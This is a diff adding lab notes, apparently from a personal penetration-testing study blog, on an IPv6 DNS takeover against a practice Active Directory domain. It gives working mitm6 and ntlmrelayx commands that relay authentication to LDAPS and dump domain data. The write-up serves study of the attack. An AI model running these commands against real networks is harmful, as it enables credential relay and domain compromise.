@@ -421,7 +421,49 @@ And, I got many helps from TCM discord.
 
     The tool works by sending malicious IPv6 Router Advertisements (RA) to force devices on the network to route their traffic through the attacker’s machine. This allows the attacker to intercept, monitor, and manipulate the data being transmitted.
 
-    Here are the processes,
+    Here are the processes I followed,
+
+    Issue: In this attack, I should have to create a new user at the end. However I am still figuring out how to make a new domain user.
+
+    1. Run `mitm6` to spoof the target network's IPv6 DNS requests.
+
+    `mitm6 -d marvel.local`
+
+    ![mitm6](../assets/img/AD/Screenshot%202024-07-18%20at%2019.37.50.png)
+
+    2. Run `ntlmrelayx` to forward the intercepted authentication attempts to the LDAP service
+
+    `ntlmrelayx.py -6 -t ldaps://192.168.64.32 -wh fakewpad.marvel.local -l lootme`
+
+    ![ldapsrunning](../assets/img/AD/Screenshot%202024-07-18%20at%2022.21.16.png)
+
+    3. Reboot the target machine
+
+    ![rebooting](../assets/img/AD/Screenshot%202024-07-18%20at%2022.22.32.png)
+
+    4. Success authentication
+
+    It says `HTTPD(80): Authenticating against ldaps://192.168.64.32 as MARVEL/THEPUNISHER$ SUCCEED`
+
+    ![successAuthentication](../assets/img/AD/Screenshot%202024-07-18%20at%2019.38.30.png)
+
+    ![mitm6logs](../assets/img/AD/Screenshot%202024-07-18%20at%2022.27.33.png)
+
+    5. Check the downloaded dir `lootme`
+
+    ![domainUser](../assets/img/AD/Screenshot%202024-07-18%20at%2022.44.25.png)
+
+    ![domainUser1](../assets/img/AD/Screenshot%202024-07-18%20at%2018.41.20.png)
+
+    ![domainUser2](../assets/img/AD/Screenshot%202024-07-18%20at%2018.41.38.png)
+
+    ![domainUser3](../assets/img/AD/Screenshot%202024-07-18%20at%2018.44.09.png)
+
+    ![domainUser4](../assets/img/AD/Screenshot%202024-07-18%20at%2018.44.22.png)
+
+    ![domainUser5](../assets/img/AD/Screenshot%202024-07-18%20at%2018.44.32.png)
+
+    6. Once I attempted to log in as a domain administrator, I should have created a user, but I failed. Let me try again.
 
 8.  IPv6 Attack Defenses (Mitigation)
 
